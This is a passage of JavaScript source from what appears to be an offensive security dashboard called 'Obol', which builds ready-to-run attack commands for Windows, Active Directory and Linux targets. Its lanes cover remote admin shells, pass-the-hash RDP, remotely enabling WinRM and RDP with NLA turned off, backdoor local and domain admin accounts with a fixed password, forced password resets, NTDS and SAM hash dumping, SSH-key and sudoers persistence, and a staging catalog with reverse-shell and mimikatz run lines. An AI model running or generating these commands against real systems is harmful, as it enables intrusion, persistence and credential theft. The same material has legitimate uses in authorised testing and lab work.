            label: 'Connect Interactive WinRM Session',
            tool: 'evil-winrm',
            locus: 'remote',
            done: hasFact('winrm.authenticated') && hasWinShell,
            note: 'Spawns an interactive PowerShell session with upload/download support.',
            variants: [
              { id: 'evil-winrm', label: 'evil-winrm', tool: 'evil-winrm', locus: 'remote', command: "evil-winrm " + evilWinrmAuth },
              { id: 'impacket-rc', label: 'impacket-rc', tool: 'nxc', locus: 'remote', command: "nxc winrm " + target + " " + nxcAuth + " -X '$PSVersionTable'" }
            ]
          }
        ]
      }, deckVariantSel),

      pcMakeLane({
        id: 'shell-rdp',
        actionId: 'win-interactive-shell',
        title: 'Graphical Desktop Session (xfreerdp)',
        sub: 'Port 3389 · Full Windows GUI',
        locked: !(hasRdp && hasCred),
        lockReason: !hasRdp ? 'Port 3389 Closed' : 'Requires Credential',
        done: hasFact('rdp.authenticated'),
        steps: [
          {
            id: 'rdp-connect',
            label: 'Launch FreeRDP Desktop',
            tool: 'xfreerdp',
            locus: 'remote',
            done: hasFact('rdp.authenticated'),
            note: 'Opens an interactive Windows desktop (/tls:seclevel:0 supports legacy Server 2008 R2 / 2012 TLS 1.0 as well as modern hosts).',
            variants: [
              { id: 'xfreerdp-pass', label: 'password', tool: 'xfreerdp', locus: 'remote', command: "xfreerdp /v:" + target + " /u:'" + activeUser + "' /p:'" + (password || '{{password}}') + "' /d:'" + (domain || '.') + "' /cert:ignore /tls:seclevel:0 +clipboard /dynamic-resolution" },
              { id: 'xfreerdp-clip', label: '+drive', tool: 'xfreerdp', locus: 'remote', command: "xfreerdp /v:" + target + xfreerdpDomFlag + " /u:'" + activeUser + "' /p:'" + (password || '{{password}}') + "' /cert:ignore /tls:seclevel:0 +clipboard /drive:share,." },
              { id: 'xfreerdp-pth', label: 'PtH /pth', tool: 'xfreerdp', locus: 'remote', command: "xfreerdp /v:" + target + xfreerdpDomFlag + " /u:'" + activeUser + "' /pth:" + (activeHash || '{{nthash}}') + " /cert:ignore /tls:seclevel:0 +clipboard" },
              { id: 'xfreerdp-sec-rdp', label: '/sec:rdp', tool: 'xfreerdp', locus: 'remote', note: 'Forces classic RDP encryption (no TLS handshake) when NLA is disabled on legacy targets.', command: "xfreerdp " + xfreerdpAuth + " /cert:ignore /sec:rdp /tls:seclevel:0 +clipboard" }
            ],
            selectedVariantId: useHashAuth ? 'xfreerdp-pth' : 'xfreerdp-pass'
          }
        ]
      }, deckVariantSel),

      pcMakeLane({
        id: 'shell-admin-exec',
        actionId: 'lateral-exec',
        title: 'Admin Remote Shell Over SMB/RPC (Port 445/135)',
        sub: 'Works even when WinRM (5985) and RDP (3389) are closed',
        locked: !(isAdmin && hasSmb),
        lockReason: !isAdmin ? 'Needs Admin' : 'Port 445 Closed',
        done: hasWinShell && isAdmin,
        steps: [
          {
            id: 'admin-exec-connect',
            label: 'Spawn Admin / SYSTEM Shell',
            tool: 'impacket-psexec',
            locus: 'remote',
            done: hasWinShell && isAdmin,
            note: 'Switch between PsExec (full interactive SYSTEM cmd.exe), WMI (no service creation), SMBExec, or NetExec one-liners.',
            variants: [
              { id: 'psexec', label: 'psexec', tool: 'impacket-psexec', locus: 'remote', command: "impacket-psexec '" + impacketIdent + "'" + impacketAuthFlags },
              { id: 'wmiexec', label: 'wmiexec', tool: 'impacket-wmiexec', locus: 'remote', command: "impacket-wmiexec '" + impacketIdent + "'" + impacketAuthFlags },
              { id: 'smbexec', label: 'smbexec', tool: 'impacket-smbexec', locus: 'remote', command: "impacket-smbexec '" + impacketIdent + "'" + impacketAuthFlags },
              { id: 'nxc', label: 'nxc smb -x', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " -x 'whoami /all'" }
            ]
          }
        ]
      }, deckVariantSel),

      pcMakeLane({
        id: 'shell-unlock-winrm',
        actionId: 'win-interactive-shell',
        title: 'Unlock WinRM Remotely -> Connect (2 Steps)',
        sub: '445 -> 5985 · Enables WinRM Listener + PSRemoting',
        locked: !(isAdmin && hasSmb),
        lockReason: !isAdmin ? 'Needs Admin' : 'Port 445 Closed',
        done: hasFact('host.winrm_enabled') && hasFact('winrm.authenticated'),
        steps: [
          {
            id: 'unlock-winrm-cmd',
            label: 'Enable WinRM Listener & Firewall Port 5985',
            tool: 'nxc',
            locus: 'remote',
            done: hasFact('host.winrm_enabled'),
            note: 'Configures WinRM AllowAutoConfig + IPv4Filter in Registry, sets LocalAccountTokenFilterPolicy=1, opens TCP 5985, restarts WinRM, and initializes PSRemoting as SYSTEM.',
            variants: [
              { id: 'nxc', label: 'nxc smb -x', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " -x '" + winrmEnableWinCmd + "'" },
              { id: 'psexec', label: 'psexec', tool: 'impacket-psexec', locus: 'remote', command: "impacket-psexec '" + impacketIdent + "'" + impacketAuthFlags + " '" + winrmEnableWinCmd + "'" },
              { id: 'wmiexec', label: 'wmiexec', tool: 'impacket-wmiexec', locus: 'remote', command: "impacket-wmiexec '" + impacketIdent + "'" + impacketAuthFlags + " '" + winrmEnableWinCmd + "'" }
            ]
          },
          {
            id: 'unlock-winrm-connect',
            label: 'Connect Interactive Evil-WinRM Shell',
            tool: 'evil-winrm',
            locus: 'remote',
            done: hasFact('winrm.authenticated'),
            note: 'Log into your newly enabled WinRM service.',
            command: "evil-winrm " + evilWinrmAuth
          }
        ]
      }, deckVariantSel),

      pcMakeLane({
        id: 'shell-unlock-rdp',
        actionId: 'win-interactive-shell',
        title: 'Unlock RDP + Firewall Remotely -> Connect (2 Steps)',
        sub: '445 -> 3389 · Enables TermService + Disables NLA',
        locked: !(isAdmin && hasSmb),
        lockReason: !isAdmin ? 'Needs Admin' : 'Port 445 Closed',
        done: hasFact('host.rdp_enabled') && hasFact('rdp.authenticated'),
        steps: [
          {
            id: 'unlock-rdp-cmd',
            label: 'Enable RDP, Disable NLA & Firewall Port 3389',
            tool: 'nxc',
            locus: 'remote',
            done: hasFact('host.rdp_enabled'),
            note: 'Sets fDenyTSConnections=0, UserAuthentication=0, DisableRestrictedAdmin=0, starts TermService, and opens TCP 3389.',
            variants: [
              { id: 'nxc', label: 'nxc smb -x', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " -x '" + rdpEnableWinCmd + "'" },
              { id: 'psexec', label: 'psexec', tool: 'impacket-psexec', locus: 'remote', command: "impacket-psexec '" + impacketIdent + "'" + impacketAuthFlags + " '" + rdpEnableWinCmd + "'" },
              { id: 'wmiexec', label: 'wmiexec', tool: 'impacket-wmiexec', locus: 'remote', command: "impacket-wmiexec '" + impacketIdent + "'" + impacketAuthFlags + " '" + rdpEnableWinCmd + "'" }
            ]
          },
          {
            id: 'unlock-rdp-connect',
            label: 'Connect Graphical Desktop (xfreerdp)',
            tool: 'xfreerdp',
            locus: 'remote',
            done: hasFact('rdp.authenticated'),
            note: 'Launches xfreerdp against the newly opened RDP port (/tls:seclevel:0 supports legacy TLS 1.0 as well as modern hosts).',
            variants: [
              { id: 'xfreerdp-tls', label: 'xfreerdp', tool: 'xfreerdp', locus: 'remote', command: "xfreerdp " + xfreerdpAuth + " /cert:ignore /tls:seclevel:0 +clipboard" },
              { id: 'xfreerdp-sec-rdp', label: 'xfreerdp /sec:rdp', tool: 'xfreerdp', locus: 'remote', note: 'Forces classic RDP encryption (no TLS handshake) once Step 1 has set UserAuthentication=0.', command: "xfreerdp " + xfreerdpAuth + " /cert:ignore /sec:rdp /tls:seclevel:0 +clipboard" }
            ]
          }
        ]
      }, deckVariantSel),

      pcMakeLane({
        id: 'shell-ssh',
        actionId: 'fix-no-tty',
        title: 'Linux SSH Interactive Shell',
        sub: 'Port 22 · Password or SSH Private Key',
        locked: !(hasSsh && hasCred && (isLinux || !hasFact('os.windows'))),
        lockReason: (hasFact('os.windows') && !isLinux) ? 'Linux Target Only' : (!hasSsh ? 'Port 22 Closed' : 'Requires Credential'),
        done: hasFact('ssh.authenticated') && hasLinShell,
        steps: [
          {
            id: 'ssh-connect-step',
            label: 'Open Interactive SSH Session',
            tool: 'ssh',
            locus: 'remote',
            done: hasFact('ssh.authenticated') && hasLinShell,
            note: 'Connects to SSH using password, private key, or sshpass.',
            variants: [
              { id: 'ssh', label: 'ssh', tool: 'ssh', locus: 'remote', command: "ssh " + activeUser + "@" + target },
              { id: 'ssh-key', label: 'ssh -i key', tool: 'ssh', locus: 'remote', command: "ssh -i id_rsa " + activeUser + "@" + target },
              { id: 'sshpass', label: 'sshpass', tool: 'sshpass', locus: 'remote', command: "sshpass -p '" + (password || '{{password}}') + "' ssh -o StrictHostKeyChecking=no " + activeUser + "@" + target }
            ]
          }
        ]
      }, deckVariantSel)
    ];

    // Tab 3: Persistence & Accounts
    var obolCreated = credsAvail.some(function (c) { return c && String(c.username || '').toLowerCase() === 'obol'; });
    var persistenceLanes = [
      pcMakeLane({
        id: 'persist-local-admin',
        actionId: 'lateral-exec',
        title: 'Create Local Admin Backdoor (obol / ObolPass123!)',
        sub: 'Mints a clean cleartext Admin + RDP + WinRM user even when you only have an NTHash',
        locked: !(!isLinuxOnly && isAdmin && (hasSmb || hasWinShell)),
        lockReason: isLinuxOnly ? 'Windows Target Only' : (!isAdmin ? 'Needs Admin' : 'Port 445 Closed'),
        done: obolCreated,
        steps: [
          {
            id: 'create-local-obol',
            label: 'Create Local Admin User (obol)',
            tool: 'nxc',
            locus: 'remote',
            done: obolCreated,
            note: 'Creates obol / ObolPass123! and adds to Administrators, Remote Desktop Users, and Remote Management Users.',
            variants: [
              { id: 'nxc', label: 'nxc smb -x', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " -x '(net user obol ObolPass123! /add & net localgroup Administrators obol /add & net localgroup \"Remote Desktop Users\" obol /add & net localgroup \"Remote Management Users\" obol /add)'" },
              { id: 'wmiexec', label: 'wmiexec', tool: 'impacket-wmiexec', locus: 'remote', command: "impacket-wmiexec '" + impacketIdent + "'" + impacketAuthFlags + " '(net user obol ObolPass123! /add & net localgroup Administrators obol /add & net localgroup \"Remote Desktop Users\" obol /add & net localgroup \"Remote Management Users\" obol /add)'" },
              { id: 'onhost-cmd', label: 'On-Host cmd.exe', tool: 'cmd', locus: 'onhost', command: '(net user obol ObolPass123! /add & net localgroup Administrators obol /add & net localgroup "Remote Desktop Users" obol /add & net localgroup "Remote Management Users" obol /add)' }
            ]
          },
          {
            id: 'validate-local-obol',
            label: 'Validate New obol Local Admin Account',
            tool: 'nxc',
            locus: 'remote',
            done: obolCreated && credsPass.some(function (c) { return c && String(c.username || '').toLowerCase() === 'obol'; }),
            note: 'Confirms Pwn3d! with your new cleartext backdoor credentials.',
            command: "nxc smb " + target + " -u obol -p 'ObolPass123!' --local-auth"
          }
        ]
      }, deckVariantSel),

      pcMakeLane({
        id: 'persist-domain-admin',
        actionId: 'own-domain-pth',
        title: 'Create Domain Admin Backdoor (obol / ObolPass123!)',
        sub: 'Creates a domain-wide Admin account in Active Directory',
        locked: !((isAdmin || hasAclLead) && isDc),
        lockReason: !isDc ? 'Requires Domain Controller / AD' : 'Needs Domain Admin or Writable ACL',
        done: obolCreated && isDc,
        steps: [
          {
            id: 'create-domain-obol',
            label: 'Create Domain Admin User (obol)',
            tool: 'nxc',
            locus: 'remote',
            done: obolCreated && isDc,
            note: 'Creates domain user obol and adds to Domain Admins, Remote Desktop Users, and Remote Management Users.',
            variants: [
              { id: 'nxc-domain', label: 'nxc smb -x', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " -x '(net user obol ObolPass123! /add /domain & net group \"Domain Admins\" obol /add /domain & net localgroup \"Remote Desktop Users\" obol /add & net localgroup \"Remote Management Users\" obol /add)'" },
              { id: 'bloodyad', label: 'bloodyAD', tool: 'bloodyAD', locus: 'remote', command: "bloodyAD " + bloodyAuth + " add user obol 'ObolPass123!' && bloodyAD " + bloodyAuth + " add groupMember 'Domain Admins' obol" },
              { id: 'onhost-domain', label: 'On-Host cmd.exe', tool: 'cmd', locus: 'onhost', command: '(net user obol ObolPass123! /add /domain & net group "Domain Admins" obol /add /domain)' }
            ]
          },
          {
            id: 'validate-domain-obol',
            label: 'Validate obol Domain Admin Account',
            tool: 'nxc',
            locus: 'remote',
            done: obolCreated && isDc,
            note: 'Validates Domain Admin access over SMB.',
            command: "nxc smb " + target + " -u obol -p 'ObolPass123!'" + (domain ? (" -d " + domain) : '')
          }
        ]
      }, deckVariantSel),

      pcMakeLane({
        id: 'persist-group-elevate',
        actionId: 'ad-path-manual',
        title: 'Add Existing User to Admin / RDP / WinRM Groups',
        sub: 'Elevates an existing compromised account without creating a new user',
        locked: !(!isLinuxOnly && (isAdmin || hasAclLead) && (hasSmb || isDc || hasWinShell)),
        lockReason: isLinuxOnly ? 'Windows / AD Target Only' : (!(isAdmin || hasAclLead) ? 'Needs Admin or Group Write ACL' : 'Port 445 Closed'),
        done: false,
        steps: [
          {
            id: 'group-elevate-step',
            label: 'Add User to Privileged Groups',
            tool: 'nxc',
            locus: 'remote',
            done: false,
            note: 'Grants Administrators, Remote Desktop Users, or Domain Admins membership.',
            variants: [
              { id: 'nxc-local', label: 'nxc (Local)', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " -x '(net localgroup Administrators \"" + activeUser + "\" /add & net localgroup \"Remote Desktop Users\" \"" + activeUser + "\" /add & net localgroup \"Remote Management Users\" \"" + activeUser + "\" /add)'" },
              { id: 'bloodyad-da', label: 'bloodyAD (Domain)', tool: 'bloodyAD', locus: 'remote', command: "bloodyAD " + bloodyAuth + " add groupMember 'Domain Admins' '" + activeUser + "'" },
              { id: 'rpcclient-grp', label: 'rpcclient', tool: 'rpcclient', locus: 'remote', command: "rpcclient " + smbClientAuth + " " + target + " -c 'adddomgroupmem 0x200 {{target_rid}}'" },
              { id: 'onhost-localgrp', label: 'On-Host cmd', tool: 'cmd', locus: 'onhost', command: 'net localgroup Administrators "' + activeUser + '" /add && net localgroup "Remote Desktop Users" "' + activeUser + '" /add' }
            ]
          }
        ]
      }, deckVariantSel),

      pcMakeLane({
        id: 'persist-pass-reset',
        actionId: 'ad-path-manual',
        title: 'Force-Reset Account Password (ObolPass123!)',
        sub: 'Exploits ForceChangePassword / GenericAll / Admin rights',
        locked: !(!isLinuxOnly && (isAdmin || hasAclLead || hasForceChangePw) && (hasSmb || isDc)),
        lockReason: isLinuxOnly ? 'Windows / AD Target Only' : (!(isAdmin || hasAclLead || hasForceChangePw) ? 'Needs Admin or ForceChangePassword ACL' : 'Port 445 / 389 Closed'),
        done: false,
        steps: [
          {
            id: 'pass-reset-step',
            label: 'Reset Target Password (ObolPass123!)',
            tool: 'bloodyAD',
            locus: 'remote',
            done: false,
            note: 'Sets a known cleartext password on the target account.',
            variants: [
              { id: 'bloodyad-pass', label: 'bloodyAD', tool: 'bloodyAD', locus: 'remote', command: "bloodyAD " + bloodyAuth + " set password '{{target_user}}' 'ObolPass123!'" },
              { id: 'rpcclient-pass', label: 'rpcclient', tool: 'rpcclient', locus: 'remote', command: "rpcclient " + smbClientAuth + " " + target + " -c \"setuserinfo2 '{{target_user}}' 23 'ObolPass123!'\"" },
              { id: 'nxc-netuser', label: 'nxc smb -x', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " -x 'net user \"{{target_user}}\" ObolPass123! /domain'" }
            ]
          }
        ]
      }, deckVariantSel),

      pcMakeLane({
        id: 'persist-hash-dump',
        actionId: 'dcsync',
        title: 'Dump Permanent Hashes (NTDS.dit / SAM / LSA)',
        sub: 'Extracts NTLM hashes for offline persistence & Pass-the-Hash',
        locked: !(!isLinuxOnly && (isAdmin || hasDcsyncRights) && (hasSmb || isDc)),
        lockReason: isLinuxOnly ? 'Windows / AD Target Only' : (!(isAdmin || hasDcsyncRights) ? 'Needs Admin or DCSync Rights' : 'Port 445 Closed'),
        done: hasFact('loot.ntds') || hasFact('hash.krbtgt') || hasFact('loot.sam'),
        steps: [
          {
            id: 'hash-dump-step',
            label: 'Dump NTDS.dit or SAM Hashes',
            tool: 'impacket-secretsdump',
            locus: 'remote',
            done: hasFact('loot.ntds') || hasFact('hash.krbtgt') || hasFact('loot.sam'),
            note: 'Paste the secretsdump / NetExec output back into Obol to auto-populate all hashes.',
            variants: [
              { id: 'secretsdump-dc', label: 'secretsdump NTDS', tool: 'impacket-secretsdump', locus: 'remote', command: "impacket-secretsdump '" + impacketIdent + "'" + impacketAuthFlags + " -just-dc-ntlm" },
              { id: 'secretsdump-sam', label: 'secretsdump SAM', tool: 'impacket-secretsdump', locus: 'remote', command: "impacket-secretsdump '" + impacketIdent + "'" + impacketAuthFlags },
              { id: 'nxc-ntds', label: 'nxc --ntds', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " --ntds" },
              { id: 'nxc-sam', label: 'nxc --sam', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " --sam --lsa" }
            ]
          }
        ]
      }, deckVariantSel),

      pcMakeLane({
        id: 'persist-linux-ssh',
        actionId: 'flag-hunt-linux',
        title: 'Linux SSH Key & Sudoers Persistence',
        sub: 'Maintains durable passwordless SSH & root access on Linux targets',
        locked: !((isLinux || !hasFact('os.windows')) && (hasLinShell || (hasSsh && hasCred))),
        lockReason: (hasFact('os.windows') && !isLinux) ? 'Linux Target Only' : 'Requires Linux Shell or SSH Credential',
        done: false,
        steps: [
          {
            id: 'linux-persist-step',
            label: 'Plant SSH Key or Sudoers Drop-In',
            tool: 'sh',
            locus: 'onhost',
            done: false,
            note: 'Guarantees instant re-entry over SSH even if application exploits rotate.',
            variants: [
              { id: 'user-ssh-key', label: 'User ~/.ssh', tool: 'sh', locus: 'onhost', command: "mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo '{{ssh_pubkey}}' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys" },
              { id: 'root-ssh-key', label: 'Root /root/.ssh', tool: 'sh', locus: 'onhost', command: "mkdir -p /root/.ssh && chmod 700 /root/.ssh && echo '{{ssh_pubkey}}' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys" },
              { id: 'sudoers-obol', label: '/etc/sudoers.d/obol', tool: 'sh', locus: 'onhost', command: "echo '" + (user || 'obol') + " ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/obol && chmod 440 /etc/sudoers.d/obol" }
            ]
          }
        ]
      }, deckVariantSel)
    ];

    // Tab 4: Shares & File Transfer
    var smbAuthFlag = hasCred ? smbClientAuth : "-N";

    var shareChoices = [];
    function addShareChoice(s) {
      if (!s || /^(IPC\$|PRINT\$)$/i.test(s)) return;
      if (shareChoices.indexOf(s) < 0) shareChoices.push(s);
    }
    readableShares.forEach(addShareChoice);
    ['Users', 'SYSVOL', 'NETLOGON', 'C$', 'ADMIN$'].forEach(addShareChoice);
    var activeSmbShare = deckParams.smb_share || (customShares.length ? chosenShare : (shareChoices[0] || 'Users'));
    if (shareChoices.indexOf(activeSmbShare) < 0) shareChoices.unshift(activeSmbShare);

    var defaultRemoteFile = userShareRelPath || ((user || 'Public') + '\\Desktop\\user.txt');
    var rawRemoteFile = typeof deckParams.remote_file === 'string' ? deckParams.remote_file.trim() : '';
    var rawLocalFile = typeof deckParams.local_file === 'string' ? deckParams.local_file.trim() : '';
    var effRemoteFile = rawRemoteFile || (rawLocalFile ? rawLocalFile.split(/[\\\/]/).pop() : defaultRemoteFile);
    var effLocalFile = rawLocalFile || (effRemoteFile.split(/[\\\/]/).pop() || 'loot.bin');

    var smbPresets = [
      { id: 'user-flag', label: 'user.txt', share: 'Users', remote: defaultRemoteFile, local: 'user.txt' },
      { id: 'gpp-xml', label: 'Groups.xml', share: chosenShare || 'SYSVOL', remote: (domain || '{{domain}}') + '\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Preferences\\Groups\\Groups.xml', local: 'Groups.xml' },
      { id: 'winpeas', label: 'winPEASx64.exe', share: isAdmin ? 'C$' : activeSmbShare, remote: isAdmin ? 'Windows\\Temp\\winPEASx64.exe' : 'winPEASx64.exe', local: 'winPEASx64.exe' },
      { id: 'nc64', label: 'nc64.exe', share: isAdmin ? 'C$' : activeSmbShare, remote: isAdmin ? 'Windows\\Temp\\nc64.exe' : 'nc64.exe', local: 'nc64.exe' },
      { id: 'sharphound', label: 'SharpHound.exe', share: isAdmin ? 'C$' : activeSmbShare, remote: isAdmin ? 'Windows\\Temp\\SharpHound.exe' : 'SharpHound.exe', local: 'SharpHound.exe' }
    ];

    var STAGE_CATALOG = [
      { id: 'winPEASx64.exe', label: 'winPEASx64.exe', os: 'win', role: 'Win PrivEsc Enum', kaliSrc: '/usr/share/peass/winpeas/winPEASx64.exe', dst: 'C:\\Windows\\Temp\\winPEASx64.exe', smbDst: 'Windows\\Temp\\winPEASx64.exe', run: 'C:\\Windows\\Temp\\winPEASx64.exe' },
      { id: 'SharpHound.exe', label: 'SharpHound.exe', os: 'win', role: 'AD BloodHound Collector', kaliSrc: '/usr/share/sharphound/SharpHound.exe', dst: 'C:\\Windows\\Temp\\SharpHound.exe', smbDst: 'Windows\\Temp\\SharpHound.exe', run: 'C:\\Windows\\Temp\\SharpHound.exe -c All --zipfilename bh.zip' },
      { id: 'nc64.exe', label: 'nc64.exe', os: 'win', role: 'Reverse Shell Binary', kaliSrc: '/usr/share/windows-resources/binaries/nc.exe', dst: 'C:\\Windows\\Temp\\nc64.exe', smbDst: 'Windows\\Temp\\nc64.exe', run: 'C:\\Windows\\Temp\\nc64.exe ' + lhost + ' ' + lport + ' -e cmd.exe' },
      { id: 'ligolo-agent.exe', label: 'ligolo-agent.exe', os: 'win', role: 'Tunneling Agent', kaliSrc: '/opt/ligolo-ng/agent.exe', dst: 'C:\\Windows\\Temp\\agent.exe', smbDst: 'Windows\\Temp\\agent.exe', run: 'C:\\Windows\\Temp\\agent.exe -connect ' + lhost + ':11601 -ignore-cert' },
      { id: 'RunasCs.exe', label: 'RunasCs.exe', os: 'win', role: 'RunAs w/ Creds', kaliSrc: '/opt/RunasCs/RunasCs.exe', dst: 'C:\\Windows\\Temp\\RunasCs.exe', smbDst: 'Windows\\Temp\\RunasCs.exe', run: 'C:\\Windows\\Temp\\RunasCs.exe ' + activeUser + ' ' + (password || '{{password}}') + ' cmd.exe -r ' + lhost + ':' + lport },
      { id: 'GodPotato.exe', label: 'GodPotato.exe', os: 'win', role: 'SeImpersonate -> SYSTEM', kaliSrc: '/opt/Potato/GodPotato-NET4.exe', dst: 'C:\\Windows\\Temp\\GodPotato.exe', smbDst: 'Windows\\Temp\\GodPotato.exe', run: 'C:\\Windows\\Temp\\GodPotato.exe -cmd "cmd /c whoami"' },
      { id: 'PrintSpoofer64.exe', label: 'PrintSpoofer64.exe', os: 'win', role: 'SeImpersonate Pipe', kaliSrc: '/opt/PrintSpoofer/PrintSpoofer64.exe', dst: 'C:\\Windows\\Temp\\PrintSpoofer64.exe', smbDst: 'Windows\\Temp\\PrintSpoofer64.exe', run: 'C:\\Windows\\Temp\\PrintSpoofer64.exe -i -c cmd' },
      { id: 'PowerView.ps1', label: 'PowerView.ps1', os: 'win', role: 'AD PowerShell Recon', kaliSrc: '/usr/share/windows-resources/powersploit/Recon/PowerView.ps1', dst: 'C:\\Windows\\Temp\\PowerView.ps1', smbDst: 'Windows\\Temp\\PowerView.ps1', run: 'powershell -ep bypass -c ". C:\\Windows\\Temp\\PowerView.ps1; Get-NetDomain"' },
      { id: 'Rubeus.exe', label: 'Rubeus.exe', os: 'win', role: 'Kerberos Toolkit', kaliSrc: '/opt/SharpCollection/NetFramework_4.7_x64/Rubeus.exe', dst: 'C:\\Windows\\Temp\\Rubeus.exe', smbDst: 'Windows\\Temp\\Rubeus.exe', run: 'C:\\Windows\\Temp\\Rubeus.exe triage' },
      { id: 'mimikatz.exe', label: 'mimikatz.exe', os: 'win', role: 'LSASS & Tickets', kaliSrc: '/usr/share/windows-resources/mimikatz/x64/mimikatz.exe', dst: 'C:\\Windows\\Temp\\mimikatz.exe', smbDst: 'Windows\\Temp\\mimikatz.exe', run: 'C:\\Windows\\Temp\\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"' },
      { id: 'linpeas.sh', label: 'linpeas.sh', os: 'lin', role: 'Linux PrivEsc Enum', kaliSrc: '/usr/share/peass/linpeas/linpeas.sh', dst: '/tmp/linpeas.sh', smbDst: 'linpeas.sh', run: 'chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh' },
      { id: 'pspy64', label: 'pspy64', os: 'lin', role: 'Cron & Process Monitor', kaliSrc: '/opt/pspy/pspy64', dst: '/tmp/pspy64', smbDst: 'pspy64', run: 'chmod +x /tmp/pspy64 && /tmp/pspy64' },
      { id: 'chisel', label: 'chisel', os: 'lin', role: 'SOCKS5 / Port Forward', kaliSrc: '/usr/bin/chisel', dst: '/tmp/chisel', smbDst: 'chisel', run: 'chmod +x /tmp/chisel && /tmp/chisel client ' + lhost + ':8000 R:socks' }
    ];
    var defaultStageId = isLinuxOnly ? 'linpeas.sh' : 'winPEASx64.exe';
    var selStageId = deckParams.stage_tool || defaultStageId;
    var activeStageTool = STAGE_CATALOG.filter(function (t) { return t.id === selStageId; })[0] || STAGE_CATALOG[0];
    var stageSmbShare = isAdmin ? 'C$' : activeSmbShare;
    var stageSmbPath = isAdmin ? activeStageTool.smbDst : activeStageTool.id;

    var sharesLanes = [
      pcMakeLane({
        id: 'shares-custom-gpp',
        actionId: 'smb-share-inventory',
        title: 'Recursive Share Listing & GPP XML Decrypt',
        sub: customShares.length ? ('Walks discovered share (' + chosenShare + ') that nxc -M gpp_password skips') : 'Walks readable shares for Group Policy XML & config files',
        locked: !(hasSmb && (hasReadableShare || hasCred)),
        lockReason: !hasPortScan && !hasSmb ? 'Run Nmap Scan First' : (!hasSmb ? 'Port 445 Closed' : 'Enumerate Shares or Add Cred First'),
        lockBadge: !hasPortScan && !hasSmb ? 'Needs Scan' : (!hasSmb ? 'Port 445 Off' : 'Needs Share'),
        done: hasGppCpass && hasCred,
        steps: [
          {
            id: 'list-share-recurse',
            label: 'Recursive List (' + chosenShare + ')',
            tool: 'smbclient',
            locus: 'remote',
            done: hasGppXml || hasGppCpass,
            note: 'Lists all nested directories and XML/config files on //' + target + '/' + chosenShare + '.',
            variants: [
              { id: 'smbclient-recurse', label: 'smbclient recurse; ls', tool: 'smbclient', locus: 'remote', command: "smbclient " + smbAuthFlag + " //" + target + "/" + chosenShare + " -c 'recurse; ls'" },
              { id: 'nxc-spider', label: 'nxc -M spider_plus', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + (hasCred ? nxcAuth : "-u '' -p ''") + " -M spider_plus" },
              { id: 'smbmap-recurse', label: 'smbmap -R', tool: 'smbmap', locus: 'remote', command: "smbmap -H " + target + " " + (hasCred ? smbmapAuth : "-u '' -p ''") + " -R " + chosenShare + " --depth 5" }
            ]
          },
          {
            id: 'pull-decrypt-gpp',
            label: 'Download *Groups.xml & Decrypt cpassword',
            tool: 'smbclient',
            locus: 'remote',
            done: hasGppCpass && hasCred,
            note: 'Bulk-downloads Groups.xml / Services.xml from any share and extracts cpassword (paste the output into Obol to auto-decrypt).',
            variants: [
              { id: 'smbclient-mget', label: 'smbclient + grep/decrypt', tool: 'smbclient', locus: 'remote', command: "smbclient " + smbAuthFlag + " //" + target + "/" + chosenShare + " -c 'prompt OFF; recurse ON; mget *Groups.xml *Services.xml *ScheduledTasks.xml *DataSources.xml' && grep -rn 'cpassword' ." + (hasGppCpass && gppCpassVal.indexOf('{{') < 0 ? (" && gpp-decrypt '" + gppCpassVal + "'") : "") },
              { id: 'impacket-gpp', label: 'GetGPPPasswords', tool: 'impacket-GetGPPPasswords', locus: 'remote', command: "impacket-GetGPPPasswords " + (hasCred ? ("'" + impacketIdent + "'" + impacketAuthFlags) : "-no-pass") + " " + target }
            ]
          }
        ]
      }, deckVariantSel),

      pcMakeLane({
        id: 'shares-file-pull',
        actionId: 'smb-share-inventory',
        title: 'Download / Upload Files Over SMB',
        sub: 'Port 445 · Share: ' + activeSmbShare + ' · Live Download (GET) & Upload (PUT)',
        locked: !(hasSmb && (hasReadableShare || hasCred)),
        lockReason: !hasPortScan && !hasSmb ? 'Run Nmap Scan First' : (!hasSmb ? 'Port 445 Closed' : 'Enumerate Shares or Add Cred First'),
        lockBadge: !hasPortScan && !hasSmb ? 'Needs Scan' : (!hasSmb ? 'Port 445 Off' : 'Needs Share'),
        done: false,
        steps: [
          {
            id: 'smb-transfer-step',
            label: 'SMB Transfer (' + activeSmbShare + ')',
            tool: 'smbclient',
            locus: 'remote',
            done: false,
            variantLabel: 'Mode:',
            note: 'Pick a Share or Quick File preset below, or type any Remote / Local path - the counterpart filename auto-fills and commands update live.',
            paramGroups: [
              {
                key: 'smb_share',
                label: 'Share:',
                active: activeSmbShare,
                options: shareChoices.map(function (s) { return { id: s, label: s }; })
              },
              {
                key: 'smb_preset',
                label: 'Quick File:',
                active: deckParams.smb_preset || '',
                options: smbPresets.map(function (p) {
                  return { id: p.id, label: p.label, sub: p.share, setParams: { smb_preset: p.id, smb_share: p.share, remote_file: p.remote, local_file: p.local } };
                })
              }
            ],
            fillInputs: [
              { key: 'remote_file', label: 'Remote Path on Share', value: rawRemoteFile, placeholder: effRemoteFile },
              { key: 'local_file', label: 'Local Kali Filename', value: rawLocalFile, placeholder: effLocalFile }
            ],
            variants: [
              { id: 'smbclient-get', label: 'GET (smbclient)', tool: 'smbclient', locus: 'remote', command: "smbclient " + smbAuthFlag + " //" + target + "/" + activeSmbShare + " -c 'get \"" + effRemoteFile + "\" \"" + effLocalFile + "\"'" },
